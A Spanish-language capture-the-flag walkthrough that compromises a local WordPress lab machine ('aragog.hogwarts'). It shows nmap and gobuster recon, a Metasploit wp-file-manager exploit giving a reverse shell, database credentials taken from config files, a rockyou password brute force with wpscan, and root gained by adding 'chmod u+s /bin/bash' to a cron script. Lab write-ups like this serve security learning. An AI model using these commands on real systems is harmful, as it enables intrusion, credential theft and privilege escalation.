Tiramos nuestra rutina de reconocimiento con nmap: 

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.101 -oN Target 

grep '^[1-9]' Target | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','

nmap -sCV -p21,22,2222,80,9898 192.168.1.101 -oN TargetsCV
```

Gracias nmap vemos que el servicio que hay un servicio ssh y un servicio http.

```bash
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| ssh-hostkey:    
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSJJ1ZAbIA3lP2RbpxnhknzLJqrHne4be3xTLmVEXWg7YQ6FFZ/RA1VzmrFYPlvB1t1XwopptI+nA9BSG5+hllLyCQ1pDZkhIwyGHuBLZETD8cIJTlsxVCwnh67h7eeK4hTEtjp1rUodK30juDf5  
u7JnkwVfo78LvM8WV1LjVrmhsZiqzy1CxAoMFpiRp3ZlvpblL3gdd0wgSNrGqEwc6qJc6Z+RKGkLbnpgTnOsc6vGLs1xFOGrHF2qFeDpUWti0ZDSN31LtP1HtNItbBKSECcFD3KrN8nPaZCa2V9GA1jrpOOAF1j0ehcRlBoFqLZzQbO9RFeIkgqGNrz3  
PDt7vp  
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBESZsj5u/F88CLIXTeBD8OgiCM2u8sKBgbvvjKccwFmCBMh3GmOHGP8qzzQwVTMkq1aN0WSIk7h8/cHCT2tZLzE=  
|   256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMsH4OtBIy/He42Rc6KvtI6w2855JMLVloVFy5/0Rtj4  
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))  
| http-methods:    
|_  Supported Methods: GET POST OPTIONS HEAD  
|_http-title: Site doesn't have a title (text/html).  
|_http-server-header: Apache/2.4.38 (Debian)  
MAC Address: 08:00:27:DD:94:52 (Oracle VirtualBox virtual NIC)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En el servicio http no vemos nada, vamos a fuzzear con gobuster a ver si encontramos algo:

```bash
gobuster dir -u "http://192.168.2.72/" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 20  
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://192.168.2.72/  
[+] Method:                  GET  
[+] Threads:                 20  
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/blog                 (Status: 301) [Size: 311] [--> http://192.168.2.72/blog/]  
/javascript           (Status: 301) [Size: 317] [--> http://192.168.2.72/javascript/]  
/server-status        (Status: 403) [Size: 277]  
Progress: 224213 / 1185255 (18.92%)^C  
[!] Keyboard interrupt detected, terminating.  
Progress: 226628 / 1185255 (19.12%)  
===============================================================  
Finished  
===============================================================
```


Encontramos la ruta hacia /blog, vamos a ver que hay

![[2024-04-10_12-15.png | 500]]

No nos resuelve, así que vamos a ver el código fuente en busca de el nombre del host para poder meterlo dentro de nuestro /etc/hosts y así poder ver bien la página web

Al parecer hay un dominio **aragog.hogwarts** y un subdominio **wordpress.aragog.hogwarts** >> /etc/hosts

Una vez dentro del blog podemos ver que es un wordpress y ademas que la url de inicio de la administración de wordpress esta por defecto en /wp-admin.

Tiramos un whatweb para ver que versión de wordpress es:

```bash
whatweb http://wordpress.aragog.hogwarts/blog
```

![[2024-04-10_12-27.png ]]


Tiramos un searchsploit  y encontramos los siguientes scripts:

![[2024-04-10_12-29.png |900]]

Antes de ver estos sploits, vamos a ver que nos dice wpscan:

```bash
wpscan --url http://wordpress.aragog.hogwarts/blog -e vp,u --api-token="APItoken"
```


![[2024-04-10_12-35.png | 500]]

wpscan nos reporta un montón de vulnerabilidades, vamos a escoger una que pinte bien :)

He probado muchas de las vulnerabilidades que hay en el wpscan y al parecer son falsos positivos, vamos a probar ocn mi siguiente opción que es el scanner de Metasploit:

`scanner/http/wordpress_scanner`

![[2024-04-10_13-15.png |600]]

Encontramos en este scanner la siguiente vulnerabilidad `wp-file-manager`

En el mismo Metasploit vemos que existe un exploit que explota esta vulnerabilidad, pero antes de ejecutarlo vamos a ver que hace:

![[2024-04-10_13-18.png |600]]

viendo un poco por encima el exploit lo que hace es meter un archivo malicioso en wordpress ubicado en **/wp-content/plugins/wp-file-manager/lib/files/malicioso.php** ejecutarlo y una vez que nos entable la reverse shell lo elimina, pues vamos a ejecutarlo a ver que pasa:


![[2024-04-10_13-18 1.png |600]]

Ejecutamos y conseguimos acceso:

![[Pasted image 20240410184733.png | 700]]

Hacemos una reverse shell hacia mi máquina por comodidad: 

![[Pasted image 20240410185032.png]]

Ahora con una consola mucho mas usable, pues lo primero que vamos hacer al saber que es un wordpress es buscar el archivo wp-config.php, dentro de el vemos una ruta muy interesante llamada config-default.php


![[Pasted image 20240410185306.png]]

Dentro de este archivo pues se empieza a calentar la cosa:

![[Pasted image 20240410185426.png]]

acabamos de sacar las credenciales de la base de datos de el wordpress, vamos a ver que hay dentro

![[Pasted image 20240410185618.png | 1000]]

dentro encontramos una password encriptada y un usuario con el que supongo que podemos entrar al wordpress, ahora con un usuario valido vamos a probar a hacer una fuerza bruta con el diccionario rockyou:

```bash
wpscan --url "http://192.168.1.101/blog" -U hagrid98 -P /usr/share/wordlists/rockyou.txt --api-token="ApiToken"
```

![[Pasted image 20240410185941.png]]

Una vez hecha la fuerza bruta, conseguimos la contraseña xd, vamos a entrar por ssh a ver si toca la flauta y efectivamente se conecta al ssh:

![[Pasted image 20240410190111.png]]

Conseguimos la flag de user, vamos a por el ruteo, empiezo con sudo -l el cual me dice que no esta instalado sudo en la máquina, buscamos por permisos SUID (find / -perm -4000 -ls 2>/dev/null) pues vamos a por tareas cron mi favorito, creamos el siguiente script para identificar tareas cron:

```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
    new_process=$(ps -eo user,command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "^[<>]" | grep -vE "procmon|command|kworker"
    old_process=$new_process
done
```

![[Pasted image 20240410190619.png]]

y como vemos hay un script que cada cierto tiempo se ejecuta con privilegios... pues tan simple como meter dentro de este script **chmod u+s /bin/bash** y la próxima vez que se ejecute la bash va a tener permisos SUID y si ejecutamos bash -p vamos a conseguir una consola como administrador.

![[Pasted image 20240410191039.png]]

